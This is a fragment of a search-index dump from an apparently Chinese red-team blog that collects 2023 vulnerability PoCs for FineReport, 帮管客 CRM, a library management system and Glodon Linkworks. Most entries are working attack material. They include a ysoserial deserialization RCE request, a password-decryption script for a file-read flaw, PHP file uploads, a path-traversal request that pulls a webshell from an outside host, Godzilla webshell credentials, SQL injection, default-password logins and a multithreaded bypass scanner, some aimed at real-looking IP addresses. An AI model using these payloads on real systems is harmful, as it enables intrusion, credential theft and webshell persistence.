{“hostinfo”:“http://1.58.73.61”,“vulfile”:“FineReport_V10_Deserialization_RCE_Vulnerability.go”,“expparams”:{“AttackType”:“ysoserial”,“URL”:\"/3334\",“PassWord”:“goby”,“Referer”:“https://gobygo.net/\",\"serializedData\":\"\",\"Gadget\":\"CommonsBeanutils1183NOCC\",\"Category\":\"Memory Shell”,“Memory Shell Category”:“TFMSFromThread”,“Web Shell”:“bx”,“command”:“whoami”}} ## fofa app=“帆软-数据决策系统” | URL | http://1.58.73.61http://120.78.127.52http://39.107.158.100 | | ---- | ---------------------------------------------------------- | ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF-%E6%95%B0%E6%8D%AE%E5%86%B3%E7%AD%96%E7%B3%BB%E7%BB%9Ffinereport-v10-webrootdecisionremotedesignchannel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:0:0","tags":["2023hw"],"title":"帆软 数据决策系统FineReport V10 webrootdecisionremotedesignchannel反序列化 ","uri":"/%E5%B8%86%E8%BD%AF-%E6%95%B0%E6%8D%AE%E5%86%B3%E7%AD%96%E7%B3%BB%E7%BB%9Ffinereport-v10-webrootdecisionremotedesignchannel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["2023hw"],"content":"# 帆软报表 channel 远程命令执行漏洞\r","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"帆软报表 channel 远程命令执行漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 帆软报表 channel 接口存在远程命令执行漏洞, 攻击者通过漏洞可以获取服务器权限，攻击服务器 ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"帆软报表 channel 远程命令执行漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 帆软报表 ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"帆软报表 channel 远程命令执行漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “Powered by 帆软” ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"帆软报表 channel 远程命令执行漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch \"cmd\" \u003e fine10.bin POST /webroot/decision/remote/design/channel HTTP/1.1 Content-Type: application/json Host: cmd: id Connection: close {{gzip(file(fine10.bin))}} ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"帆软报表 channel 远程命令执行漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"帆软报表 V8 get_geo_json 任意文件读取漏洞 WebReport/ReportServer?op=chart\u0026cmd=get_geo_json\u0026resourcepath=privilege.xml 获得账号密码后进行解密，解密脚本如下 解密脚本 cipher = 'XXXXXXXXXXX' #密文 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] Password = \"\" cipher = cipher[3:] for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) ","date":"2023-12-08","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-get_geo_json-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"帆软报表 V8 get_geo_json 任意文件读取漏洞","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-get_geo_json-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\r(title=\"用户登录\" \u0026\u0026 body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"\u003cp id=\\\"admintips\\\" \u003e初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\" product=\"帮管客-CRM\" ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload_chat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"帮管客 CRM ajax_upload_chat 文件上传漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload_chat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Poc POST /index.php/upload/ajax_upload_chat?type=image HTTP/1.1 Host: zrd.houdezg.com:1026 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl Cookie: bgk_session=bgk_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2270edc36351739620753a2beeca7681a8%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%2282.156.29.211%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A119%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_14_3%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F12.0.3+Safari%2F605.1.15%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1691549409%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D893b1adbc9cfecf3f5a77a0581ffc946adf90933; Accept-Encoding: gzip Content-Length: 184 ------WebKitFormBoundaryP85wZUzxCEb9PRNl Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\" Content-Type: image/jpeg test ------WebKitFormBoundaryP85wZUzxCEb9PRNl-- ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload_chat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"帮管客 CRM ajax_upload_chat 文件上传漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload_chat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\r(title=\"用户登录\" \u0026\u0026 body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"\u003cp id=\\\"admintips\\\" \u003e初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\" product=\"帮管客-CRM\" ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"帮管客 CRM ajax_upload文件上传漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Poc POST /index.php/upload/ajax_upload HTTP/1.1 Host: 101.42.246.202:90 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o Accept-Encoding: gzip Content-Length: 189 ------WebKitFormBoundaryv1WbOn5o Content-Disposition: form-data; name=\"file\"; filename=\"1.php\" Content-Type: image/jpeg \u003c?php phpinfo();unlink(__FILE__); ------WebKitFormBoundaryv1WbOn5o-- ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"帮管客 CRM ajax_upload文件上传漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-ajax_upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\r(title=\"用户登录\" \u0026\u0026 body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"\u003cp id=\\\"admintips\\\" \u003e初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\" product=\"帮管客-CRM\" ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"帮管客 CRM 敏感信息泄露漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"Poc GET /index.php/chat/init HTTP/1.1 Host: zrd.houdezg.com:1026 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"帮管客 CRM 敏感信息泄露漏洞","uri":"/%E5%B8%AE%E7%AE%A1%E5%AE%A2-crm-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"广州图创图书馆集群管理系统存在未授权访问 广州图创图书馆集群管理系统是一款为图书馆设计的综合性管理软件。它能够实现对图书、读者、借阅、归还等方面的管理，同时支持各类图书馆的联合管理，提高了馆藏利用率和服务效率。此外，该系统还具有自动化预约提醒、在线预约、自助借还、智能查询等功能，让读者能够更加便捷地使用图书馆资源。该系统采用分布式架构，具有安全可靠的特点，可以根据不同图书馆的需求进行配置，提供优质的服务。该系统的实现，极大地提高了图书馆的管理效率，为读者提供了更好的服务体验。 广州图创计算机软件开发有限公司图书馆集群管理系统存在逻辑绕过，攻击者可通过此漏洞登录后台。 ","date":"2023-12-08","objectID":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":["2023hw漏洞"],"title":"广州图创图书馆集群管理系统存在未授权访问","uri":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"Fofa body=\"广州图创计算机软件开发有限公司\" ","date":"2023-12-08","objectID":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":["2023hw漏洞"],"title":"广州图创图书馆集群管理系统存在未授权访问","uri":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"poc GET /interlib/common/SSOServlet? HTTP/1.1 ","date":"2023-12-08","objectID":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:3:0","tags":["2023hw漏洞"],"title":"广州图创图书馆集群管理系统存在未授权访问","uri":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"批量检测脚本 import argparse import requests import urllib3 from concurrent.futures import ThreadPoolExecutor from urllib3.exceptions import InsecureRequestWarning urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Suppress only the single InsecureRequestWarning from urllib3 needed for HTTPS requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) def send_request(url): headers = { 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'iv-user': 'admin', 'Connection': 'close' } try: response = requests.get(url + '/interlib/common/SSOServlet?', headers=headers, verify=False) if response.status_code == 200: print(f'{url} 存在逻辑绕过漏洞.') else: print(f'{url} no.') except requests.RequestException as e: print(f'Error scanning {url}: {e}') def main(): parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', help='Single URL to scan') parser.add_argument('-r', '--readfile', help='File containing list of URLs to scan') args = parser.parse_args() urls = [] if args.url: urls.append(args.url) if args.readfile: with open(args.readfile, 'r') as file: urls.extend([line.strip() for line in file.readlines()]) with ThreadPoolExecutor(max_workers=15) as executor: executor.map(send_request, urls) if __name__ == \"__main__\": main() ","date":"2023-12-08","objectID":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:4:0","tags":["2023hw漏洞"],"title":"广州图创图书馆集群管理系统存在未授权访问","uri":"/%E5%B9%BF%E5%B7%9E%E5%9B%BE%E5%88%9B%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%9B%86%E7%BE%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"Glodon-控制台\" 默认密码 admin ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/:0:0","tags":["2023hw"],"title":"广联达 Glodon-控制台 默认密码","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"},{"categories":["2023hw"],"content":"数据包 POST /Console/Account/LogOn HTTP/1.1 Host: 1.116.53.66:8880 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip Content-Length: 57 pws=600350034003f0025007a002a007a002500670062006b006f0068 POST /Console/Account/LogOn HTTP/1.1 Host: 1.116.53.66:8880 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Accept-Encoding: gzip Content-Length: 57 pws=30035003400360020007f002f007f002000620067006e006a006d ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/:1:0","tags":["2023hw"],"title":"广联达 Glodon-控制台 默认密码","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"},{"categories":["2023hw"],"content":"数据库 GET /Console/Service/Manage/ModifyDataBase?dataBaseName=default HTTP/1.1 Host: 112.31.70.58:8880 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Connection: close Cookie: ConsoleLogOn=8E9C144674893F58C1F9C2494DE1F0F705C9DA0AEC0FBA4E41758EE8FE46EAA919DCE8D40D17A835F2639CF9DCCB7FCBF1CDB800AE42A90E918C26C7B9B338F0B6118E129F7AAD27B7D0BE69C6A3B41722C8DD8739BF8C410D7C9A4FCA07405B7A919400711A5485FEF4B694CA7DEBAEC43C6BE24C5C941F4E50E5BC4034A34BE550AAF671D699C7667A9DCD53AE9AAE; path=/; HttpOnly X-Requested-With: XMLHttpRequest Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/:2:0","tags":["2023hw"],"title":"广联达 Glodon-控制台 默认密码","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-glodon-%E6%8E%A7%E5%88%B6%E5%8F%B0-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\" ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"广联达 linkworks GBLKArchiveManagementJsGWGDWebService.asmx 文件上传漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc WebShell URL: http://1.116.53.66:8866/Common/D10febfbD4AD9e4f.aspx Password: pass 加密器：JAVA_AES_BASE64 WebShell tool: Godzilla v4.1 POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1 Host: 1.116.53.66:8866 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: text/xml; charset=utf-8 Accept-Encoding: gzip Content-Length: 954 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003ctem:GetGWGDData\u003e \u003c!--Optional:--\u003e \u003ctem:data\u003e \u003croot\u003e \u003cGWINFO\u003e \u003c鍏枃鏍囬\u003e1\u003c/鍏枃鏍囬\u003e \u003c鎷熺浜?鎷熺浜?/鎷熺浜? \u003c涓婚€佸崟浣?涓婚€佸崟浣?/涓婚€佸崟浣? \u003c涓婚璇?涓婚璇?/涓婚璇? \u003c鍗板彂浠芥暟\u003e1\u003c/鍗板彂浠芥暟\u003e \u003c绛惧彂鏃ユ湡\u003e2022-12-07\u003c/绛惧彂鏃ユ湡\u003e \u003c/GWINFO\u003e \u003caa\u003e \u003cFileName\u003e./../../../../../../../applications/gtp-default/Web/Common/55B2efF7fBb2d555.aspx\u003c/FileName\u003e \u003cDownLoadURL\u003ehttps://gobygo.net/ps/aspx/upload.aspx\u003c/DownLoadURL\u003e \u003c/aa\u003e \u003c/root\u003e \u003c/tem:data\u003e \u003c/tem:GetGWGDData\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"广联达 linkworks GBLKArchiveManagementJsGWGDWebService.asmx 文件上传漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"goexp POST /api/v1/debugExp HTTP/1.1 Content-Type: application/json;charset=UTF-8 Authorization: Basic dXNlcjpwYXNz host: 82.156.29.211:8365 Connection: close Content-Length: 159 {\"hostinfo\":\"1.116.53.66:8866\",\"vulfile\":\"CVD-2023-2868.go\",\"expparams\":{\"attackType\":\"webshell\",\"webshell\":\"godzilla\",\"filename\":\"test.txt\",\"content\":\"test\"}} ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"广联达 linkworks GBLKArchiveManagementJsGWGDWebService.asmx 文件上传漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gblkarchivemanagementjsgwgdwebservice.asmx-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\" ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserbyemployeecode-%E6%96%87%E4%BB%B6-employeecode-%E5%8F%82%E6%95%B0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"广联达-Linkworks 协同办公管理平台 Service.asmx GetUserByEmployeeCode 文件 employeeCode 参数 SQL注入漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserbyemployeecode-%E6%96%87%E4%BB%B6-employeecode-%E5%8F%82%E6%95%B0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1 Host: 112.245.48.187:8188 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 39 employeeCode=1'-1/user--'\u0026EncryptData=1 ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserbyemployeecode-%E6%96%87%E4%BB%B6-employeecode-%E5%8F%82%E6%95%B0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"广联达-Linkworks 协同办公管理平台 Service.asmx GetUserByEmployeeCode 文件 employeeCode 参数 SQL注入漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserbyemployeecode-%E6%96%87%E4%BB%B6-employeecode-%E5%8F%82%E6%95%B0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\" ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserxml4geps-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"广联达-Linkworks 协同办公管理平台 Service.asmx GetUserXml4GEPS 信息泄露漏洞","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserxml4geps-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://202.110.234.94:8888/Org/service/Service.asmx?op=GetUserXml4GEPS ","date":"2023-12-08","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.asmx-getuserxml4geps-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"广联达-Linkworks 协同办公管理平台 Service.asmx GetUserXml4GEPS 